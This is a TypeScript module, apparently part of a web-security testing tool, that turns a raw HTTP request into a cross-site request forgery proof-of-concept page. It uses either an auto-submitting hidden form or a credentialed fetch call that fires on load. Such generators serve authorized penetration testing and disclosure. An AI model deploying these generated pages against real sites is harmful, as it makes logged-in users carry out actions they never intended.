import { parseHttpMessage } from "@/lib/httpMessage";

function esc(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

function safeUrl(u: string): URL | null {
  try {
    return new URL(u);
  } catch {
    return null;
  }
}

function formPoc(action: string, method: string, fields: [string, string][]): string {
  const inputs = fields
    .map(([n, v]) => `    <input type="hidden" name="${esc(n)}" value="${esc(v)}">`)
    .join("\n");
  return `<!doctype html>
<html>
  <body onload="document.forms[0].submit()">
    <h3>CSRF PoC — ${esc(method)} ${esc(action)}</h3>
    <form action="${esc(action)}" method="${esc(method)}">
${inputs}
      <input type="submit" value="Submit">
    </form>
  </body>
</html>`;
}

function fetchPoc(url: string, method: string, contentType: string, body: string): string {
  return `<!doctype html>
<html>
  <body>
    <h3>CSRF PoC (fetch) — ${esc(method)} ${esc(url)}</h3>
    <button onclick="go()">Fire</button>
    <script>
      function go() {
        fetch(${JSON.stringify(url)}, {
          method: ${JSON.stringify(method)},
          mode: "no-cors",
          credentials: "include",
          headers: { "Content-Type": ${JSON.stringify(contentType || "text/plain")} },
          body: ${JSON.stringify(body)}
        });
      }
      go();
    </script>
    <p>Note: a JSON body with a JSON Content-Type is not a "simple" request; this
       fires only where CORS is permissive or the endpoint accepts text/plain.</p>
  </body>
</html>`;
}

export function buildCsrfPoc(requestText: string): { html: string; note: string } | null {
  const msg = parseHttpMessage(requestText);
  if (!msg) return null;
  const method = msg.method.toUpperCase();
  const contentType = (msg.headers.find(([n]) => n.toLowerCase() === "content-type")?.[1] || "").toLowerCase();

  if (method === "GET") {
    const u = safeUrl(msg.url);
    const fields = u ? ([...u.searchParams.entries()] as [string, string][]) : [];
    const action = u ? u.origin + u.pathname : msg.url;
    return { html: formPoc(action, "GET", fields), note: "GET CSRF" };
  }
  if (/x-www-form-urlencoded/.test(contentType) || (!contentType && /^[^=&\s]+=/.test(msg.body.trim()))) {
    const fields = msg.body
      .split("&")
      .filter(Boolean)
      .map((p) => {
        const i = p.indexOf("=");
        return (i < 0 ? [p, ""] : [decodeURIComponent(p.slice(0, i)), decodeURIComponent(p.slice(i + 1))]) as [string, string];
      });
    return { html: formPoc(msg.url, method, fields), note: "form POST CSRF" };
  }
  return { html: fetchPoc(msg.url, method, contentType, msg.body), note: "fetch PoC (JSON / other)" };
}
